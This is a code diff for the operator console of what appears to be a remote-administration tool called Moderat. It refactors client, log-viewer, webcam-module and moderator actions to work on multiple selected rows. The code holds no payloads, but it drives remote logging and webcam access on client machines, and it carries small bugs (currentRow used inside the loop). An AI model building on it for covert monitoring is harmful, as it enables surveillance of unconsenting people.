@@ -86,58 +86,63 @@ class Actions:
         Set Alias For Client
         :return:
         '''
-        client, alias, ip_address = self.current_client()
-        if client:
-            text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
-            if ok:
-                unicode_text = unicode(text)
-                self.moderat.moderator.send_msg('%s %s' % (client, unicode_text), 'setAlias',
-                                                session_id=self.moderat.session_id)
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                text, ok = QInputDialog.getText(self.moderat, _('ALIAS_SET'), _('ALIAS_NAME'))
+                if ok:
+                    unicode_text = unicode(text)
+                    self.moderat.moderator.send_msg('%s %s' % (client, unicode_text), 'setAlias',
+                                                    session_id=self.moderat.session_id)
 
     @client_is_selected
     def remove_client(self):
-        client, alias, ip_address = self.current_client()
-        if client:
-            reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'), QMessageBox.Yes, QMessageBox.No)
-            if reply == QMessageBox.Yes:
-                self.moderat.moderator.send_msg('%s' % client, 'removeClient', session_id=self.moderat.session_id)
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'), QMessageBox.Yes, QMessageBox.No)
+                if reply == QMessageBox.Yes:
+                    self.moderat.moderator.send_msg('%s' % client, 'removeClient', session_id=self.moderat.session_id)
 
     @client_is_selected
     def log_viewer(self):
-        client, alias, ip_address = self.current_client()
-        if client:
-            module_id = id_generator()
-            client_config = {
-                    'moderator':    self.moderat.moderator,
-                    'moderat':      self.moderat,
-                    'client':       client,
-                    'alias':        alias,
-                    'ip_address':   ip_address,
-                    'os':           os,
-                    'session_id':   self.moderat.session_id,
-                    'assets':       self.moderat.assets,
-                    'module_id':    module_id,
-            }
-            self.moderat.logViewers[module_id] = LogViewer(client_config)
-            self.moderat.logViewers[module_id].show()
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                module_id = id_generator()
+                client_config = {
+                        'moderator':    self.moderat.moderator,
+                        'moderat':      self.moderat,
+                        'client':       client,
+                        'alias':        alias,
+                        'ip_address':   ip_address,
+                        'os':           os,
+                        'session_id':   self.moderat.session_id,
+                        'assets':       self.moderat.assets,
+                        'module_id':    module_id,
+                }
+                self.moderat.logViewers[module_id] = LogViewer(client_config)
+                self.moderat.logViewers[module_id].show()
 
     @client_is_selected
     def set_log_settings(self):
-        client, alias, ip_address = self.current_client()
-        if client:
-            client_config = self.clients.get_client(client)
-            client_config['moderator'] = self.moderat.moderator
-            client_config['client'] = client
-            client_config['session_id'] = self.moderat.assets
-            client_config['assets'] = self.moderat.assets
-            self.log_settings = LogSettings(client_config)
-            self.log_settings.show()
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                client_config = self.clients.get_client(client)
+                client_config['moderator'] = self.moderat.moderator
+                client_config['client'] = client
+                client_config['session_id'] = self.moderat.assets
+                client_config['assets'] = self.moderat.assets
+                self.log_settings = LogSettings(client_config)
+                self.log_settings.show()
 
     @client_is_selected
     def update_source(self):
-        client, alias, ip_address = self.current_client()
-        if client:
-            self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id, _to=client, module_id='')
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                self.moderat.moderator.send_msg('updateSource', 'updateSource', session_id=self.moderat.session_id, _to=client, module_id='')
 
     @client_is_selected
     def execute_module(self, module):
@@ -149,49 +154,60 @@ class Actions:
             'webcam': mwebcam,
         }
 
-        client, alias, ip_address = self.current_client()
-        if client:
-            module_id = id_generator()
-            args = {
-                'moderator': self.moderat.moderator,
-                'client': client,
-                'session_id': self.moderat.session_id,
-                'assets': self.moderat.assets,
-                'plugins': self.moderat.plugins,
-                'plugins_dir': self.moderat.plugins_dir,
-                'module_id': module_id,
-            }
-            if module in modules:
-                self.moderat.modulesBank[module_id] = modules[module].mainPopup(args)
-                self.moderat.modulesBank[module_id].show()
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                module_id = id_generator()
+                args = {
+                    'moderator': self.moderat.moderator,
+                    'client': client,
+                    'session_id': self.moderat.session_id,
+                    'assets': self.moderat.assets,
+                    'plugins': self.moderat.plugins,
+                    'plugins_dir': self.moderat.plugins_dir,
+                    'module_id': module_id,
+                }
+                if module in modules:
+                    self.moderat.modulesBank[module_id] = modules[module].mainPopup(args)
+                    self.moderat.modulesBank[module_id].show()
 
-    # get online client
     def current_client(self):
         tab_index = self.moderat.clientsTabs.currentIndex()
         if tab_index == 0:
-            try:
-                return (
-                    str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 3).text()),
-                    unicode(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 2).text()),
-                    str(self.moderat.clientsTable.item(self.moderat.clientsTable.currentRow(), 1).text()),
-                )
-            except AttributeError:
-                return False
+            selected_rows = sorted(self.moderat.clientsTable.selectionModel().selectedRows())
+            payload = []
+            for index in selected_rows:
+                try:
+                    payload.append((
+                        str(self.moderat.clientsTable.item(index.row(), 3).text()),
+                        unicode(self.moderat.clientsTable.item(index.row(), 2).text()),
+                        str(self.moderat.clientsTable.item(index.row(), 1).text()),
+                    ))
+                except AttributeError:
+                    pass
+            return payload
         elif tab_index == 1:
-            try:
-                return (
-                    str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 1).text()),
-                    unicode(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 2).text()),
-                    str(self.moderat.offlineClientsTable.item(self.moderat.offlineClientsTable.currentRow(), 3).text()),
-                )
-            except AttributeError:
-                return False
-
+            selected_rows = sorted(self.moderat.offlineClientsTable.selectionModel().selectedRows())
+            payload = []
+            for index in selected_rows:
+                try:
+                    payload.append((
+                        str(self.moderat.offlineClientsTable.item(index.row(), 1).text()),
+                        unicode(self.moderat.offlineClientsTable.item(index.row(), 2).text()),
+                        str(self.moderat.offlineClientsTable.item(index.row(), 3).text()),
+                    ))
+                except AttributeError:
+                    pass
+            return payload
         elif tab_index == 2:
-            try:
-                return str(self.moderat.moderatorsTable.item(self.moderat.moderatorsTable.currentRow(), 0).text())
-            except AttributeError:
-                return False
+            selected_rows = sorted(self.moderat.moderatorsTable.selectionModel().selectedRows())
+            payload = []
+            for index in selected_rows:
+                try:
+                    payload.append(str(self.moderat.moderatorsTable.item(self.moderat.moderatorsTable.currentRow(), 0).text()))
+                except AttributeError:
+                    pass
+            return payload
 
     def close_moderat(self):
         # Stop Clients Checker
@@ -206,11 +222,12 @@ class Actions:
     # Administrators
     @client_is_selected
     def administrator_set_moderator(self):
-        client, alias, ip_address = self.current_client()
-        if client:
-            text, ok = QInputDialog.getText(self.moderat, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
-            if ok:
-                self.moderat.moderator.send_msg('%s %s' % (client, text), 'setModerator', session_id=self.moderat.session_id, _to=client)
+        for client_args in self.current_client():
+            client, alias, ip_address = client_args
+            if client:
+                text, ok = QInputDialog.getText(self.moderat, _('SET_MODERATOR_TITLE'), _('SET_MODERATOR_USERNAME'), QLineEdit.Normal)
+                if ok:
+                    self.moderat.moderator.send_msg('%s %s' % (client, text), 'setModerator', session_id=self.moderat.session_id, _to=client)
 
     def administrator_get_moderators(self):
         self.moderat.moderator.send_msg(message='getModerators', mode='getModerators', session_id=self.moderat.session_id)
@@ -243,43 +260,46 @@ class Actions:
             return
 
     def administrator_change_moderator_password(self):
-        moderator = self.current_client()
-        password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
-        if ok and len(str(password)) > 3:
-            password1 = str(password)
+        for moderator_args in self.current_client():
+            moderator = moderator_args
             password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
             if ok and len(str(password)) > 3:
-                password2 = str(password)
+                password1 = str(password)
+                password, ok = QInputDialog.getText(self.moderat, _('ADMINISTRATION_INPUT_PASSWORD'), _('ADMINISTRATION_PASSWORD'), QLineEdit.Password)
+                if ok and len(str(password)) > 3:
+                    password2 = str(password)
 
-                if password1 == password2:
-                    self.moderat.moderator.send_msg('%s %s' % (moderator, password1), 'changePassword', session_id=self.moderat.session_id)
+                    if password1 == password2:
+                        self.moderat.moderator.send_msg('%s %s' % (moderator, password1), 'changePassword', session_id=self.moderat.session_id)
+                    else:
+                        warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_PASSWORD_NOT_MATCH'), _('ADMINISTRATION_PASSWORD_NOT_MATCH'))
+                        ans = warn.exec_()
+                        return
+                # if not password
                 else:
-                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_PASSWORD_NOT_MATCH'), _('ADMINISTRATION_PASSWORD_NOT_MATCH'))
+                    warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                     ans = warn.exec_()
                     return
-            # if not password
             else:
                 warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
                 ans = warn.exec_()
                 return
-        else:
-            warn = QMessageBox(QMessageBox.Warning, _('ADMINISTRATION_INCORRECT_PASSWORD'), _('ADMINISTRATION_INCORRECT_PASSWORD'))
-            ans = warn.exec_()
-            return
 
     def administrator_change_moderator_privilege(self):
-        moderator = self.current_client()
-        privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'),
-                                              ('0', '1'), 0, False)
-        admin = str(privileges)
-        if ok and privileges:
-            self.moderat.moderator.send_msg('%s %s' % (moderator, admin), 'changePrivilege',
-                                            session_id=self.moderat.session_id)
+        for moderator_args in self.current_client():
+            moderator = moderator_args
+            privileges, ok = QInputDialog.getItem(self.moderat, _('ADMINISTRATION_INPUT_PRIVS'), _('ADMINISTRATION_PRIVS'),
+                                                  ('0', '1'), 0, False)
+            admin = str(privileges)
+            if ok and privileges:
+                self.moderat.moderator.send_msg('%s %s' % (moderator, admin), 'changePrivilege',
+                                                session_id=self.moderat.session_id)
 
     def administrator_remove_moderator(self):
-        moderator = self.current_client()
-        reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'),
-                                      QMessageBox.Yes, QMessageBox.No)
-        if reply == QMessageBox.Yes:
-            self.moderat.moderator.send_msg('%s' % moderator, 'removeModerator',
-                                            session_id=self.moderat.session_id)
+        for moderator_args in self.current_client():
+            moderator = moderator_args
+            reply = QMessageBox.question(self.moderat, _('ADMINISTRATION_QUESTION_REMOVE'), _('ADMINISTRATION_QUESTION_REMOVE'),
+                                          QMessageBox.Yes, QMessageBox.No)
+            if reply == QMessageBox.Yes:
+                self.moderat.moderator.send_msg('%s' % moderator, 'removeModerator',
+                                                session_id=self.moderat.session_id)
